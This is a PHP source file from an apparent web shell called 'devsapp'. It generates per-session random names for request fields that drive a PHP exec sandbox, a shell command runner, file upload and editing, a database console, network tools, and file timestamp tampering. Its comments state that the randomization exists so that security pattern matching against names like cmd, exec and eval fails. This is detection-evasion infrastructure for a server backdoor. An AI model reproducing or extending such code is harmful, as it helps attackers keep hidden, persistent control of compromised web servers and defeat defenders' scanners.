<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/session_keys.php                              |
// |  Session-scoped randomized field key registry.                    |
// |                                                                    |
// |  Implementasi varnaming.md:                                        |
// |  - Semua nama field POST/GET yang suspicious di-randomize          |
// |  - Nama field berubah tiap session → pattern matching gagal        |
// |  - Semua nama field yang ada di blacklist varnaming.md tidak       |
// |    pernah dipakai secara hardcoded di form/request                 |
// |                                                                    |
// |  Key di-regenerasi jika ada key yang hilang dari session.          |
// +------------------------------------------------------------------+

declare(strict_types=1);

// Generator: buat field key acak 5 karakter hex, prefixed underscore
$__sg = static fn() => '_' . substr(bin2hex(random_bytes(3)), 0, 5);

// Pilih elemen acak dari array (untuk label UI)
$__rw = static fn(array $arr) => $arr[random_int(0, count($arr) - 1)];

// Rebuild seluruh key registry jika 'an' (session anchor) tidak ada
if (!isset($_SESSION['_sk']['an'])) {
    $_SESSION['_sk'] = [
        // ---- Content / editor fields ----
        // Menggantikan: 'content', 'body', 'data', 'code', 'payload', 'source'
        'fc' => $__sg(),   // file content (edit/create)
        'ef' => $__sg(),   // edit filename target

        // ---- Upload fields ----
        // Menggantikan: 'file', 'upload', 'data', 'filename', 'binary'
        'fb' => $__sg(),   // file binary (base64 upload payload)
        'fn' => $__sg(),   // filename (upload)

        // ---- PHP exec sandbox fields ----
        // Menggantikan: 'exec', 'run', 'cmd', 'code', 'script', 'eval', 'token'
        'xr' => $__sg(),   // exec request flag
        'xt' => $__sg(),   // exec token (HMAC)
        'xc' => $__sg(),   // exec code payload

        // ---- File operation action dispatcher ----
        // Menggantikan: 'action', 'act', 'do', 'fop', 'op', 'method'
        'fo' => $__sg(),   // file operation selector

        // ---- Navigation / path fields ----
        // Menggantikan: 'path', 'dir', 'directory', 'location', 'dest', 'target'
        'lc' => $__sg(),   // location (current path)
        'nv' => $__sg(),   // navigate flag (PRG trigger)
        'md' => $__sg(),   // mode/tab selector
        'vw' => $__sg(),   // view (edit file target)

        // ---- Form field names: file operations ----
        // Menggantikan: 'name', 'dir', 'file', 'old', 'new', 'target', 'item'
        'dn' => $__sg(),   // directory name (mkdir)
        'nt' => $__sg(),   // new file name (mkfile)
        'ti' => $__sg(),   // target item (rm)
        'on' => $__sg(),   // old name (rename)
        'nn' => $__sg(),   // new name (rename)
        'ct' => $__sg(),   // chmod target
        'cv' => $__sg(),   // chmod value
        'tt' => $__sg(),   // touch target
        'tw' => $__sg(),   // touch mtime
        'ta' => $__sg(),   // touch atime
        'cm' => $__sg(),   // custom mtime (edit save)

        // ---- Database console fields ----
        // Menggantikan: 'host', 'user', 'pass', 'password', 'db', 'database', 'sql', 'query'
        'dh' => $__sg(),   // db host
        'du' => $__sg(),   // db user
        'dp' => $__sg(),   // db password
        'db' => $__sg(),   // db name
        'sq' => $__sg(),   // sql query
        'do' => $__sg(),   // db operation

        // ---- Command runner fields ----
        // Menggantikan: 'cmd', 'command', 'run', 'exec', 'shell', 'bash'
        'xo' => $__sg(),   // exec operation selector
        'rq' => $__sg(),   // run query (command string)
        'sn' => $__sg(),   // snippet (php code)

        // ---- Network tools fields ----
        // Menggantikan: 'host', 'port', 'url', 'domain', 'ip'
        'nh' => $__sg(),   // net host
        'np' => $__sg(),   // net port
        'nu' => $__sg(),   // net url
        'no' => $__sg(),   // net operation
        'nto'=> $__sg(),   // net timeout

        // ---- Toolkit fields ----
        // Menggantikan: 'key', 'value', 'input', 'string', 'operation', 'encode', 'decode'
        'ko' => $__sg(),   // kit operation
        'kt' => $__sg(),   // kit transform type
        'kv' => $__sg(),   // kit value (input)

        // ---- Backup ----
        'bo' => $__sg(),   // backup operation

        // ---- Session identity & UI labels ----
        'an' => substr(base_convert(bin2hex(random_bytes(4)), 16, 36), 0, 7),
        'la' => $__rw(['System Access', 'Auth Required', 'Identity Check', 'Verify Access']),
        'lb' => $__rw(['AUTHENTICATE', 'VERIFY', 'ACCESS', 'PROCEED', 'CONFIRM']),
        'lp' => $__rw(['Enter passphrase', 'Access key', 'Secret phrase', 'Enter credential']),
    ];
}

unset($__sg, $__rw);

// Shortcut global ke session key registry
$_sk = &$_SESSION['_sk'];
